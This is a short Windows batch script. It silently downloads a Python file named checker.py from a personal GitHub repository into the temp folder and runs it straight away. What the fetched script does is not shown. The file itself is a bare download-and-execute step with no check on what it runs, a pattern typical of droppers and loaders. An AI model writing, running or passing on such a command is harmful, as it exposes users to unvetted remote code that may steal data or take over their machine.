@echo off
curl -s -o "%TEMP%\checker.py" https://raw.githubusercontent.com/ishmuratovazizi-afk/checker-bot/main/checker.py
py "%TEMP%\checker.py"
